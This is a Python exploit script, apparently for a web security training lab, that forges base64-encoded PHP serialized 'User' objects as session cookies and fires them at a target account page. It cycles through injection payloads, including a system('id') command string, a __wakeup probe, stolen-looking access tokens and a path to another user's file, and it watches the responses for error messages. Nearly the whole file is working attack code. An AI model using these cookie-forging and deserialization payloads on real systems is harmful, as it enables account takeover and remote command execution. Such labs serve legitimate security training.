from pwn import *
import base64
import requests
from urllib.parse import quote
import urllib3

BASE_URL = "https://0aa900cd03b6dfe680e21795001500eb.web-security-academy.net/"
TARGET_PATH = "/my-account?id=carlos"
DEFAULT_COOKIES = {
    "session": "" 
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Payloads to test (edit as needed)
payloads = [
    '"onload"=>system("id")',
    '"__wakeup"=>die("hi")',
    '"access_token"=>"td5a6oxagbwagxazf7ob6x00ih19n5it"',
    '"username"=>"carlos"',
    '"avatar_link"=>"users/carlos/avatar"',
    'td5a6oxagbwagxazf7ob6x00ih19n5it',
    '/home/carlos/morale.txt'
]

# PHP object template
base_obj = 'O:4:"User":3:{{s:8:"username";s:{ulen}:"{user}";s:12:"access_token";s:{tlen}:"{token}";s:11:"avatar_link";s:{alen}:"{alink}";}}'

def generate_serial(username, token, avatar):
    obj = base_obj.format(
        ulen=len(username),
        user=username,
        tlen=len(token),
        token=token,
        alen=len(avatar),
        alink=avatar
    )
    b64 = base64.b64encode(obj.encode()).decode()
    return quote(b64)

def send_test(base_url, path, cookies, injection_payloads):
    for payload in injection_payloads:
        print(f"\n[+] Testing payload in URL: {payload}")
        b64cookie = generate_serial("wiener", "favdodxu3v0au0cyryo8ogf1ugjkl1e0", payload)
        cookies["session"] = b64cookie
        print(f"  → Cookie: {cookies['session'][:180]}...")

        try:
            r = requests.get(
                base_url + path,
                cookies=cookies,
                verify=False,
                proxies=PROXIES,
                timeout=10
            )
            print(f"  ← Status: {r.status_code}, Length: {len(r.text)}")
            if "Fatal error" in r.text or "Exception" in r.text:
                print("  ⚠️  Possible injection triggered!")
        except Exception as e:
            print(f"  ⚠️  Request error: {e}")

send_test(BASE_URL, TARGET_PATH, DEFAULT_COOKIES.copy(), payloads)
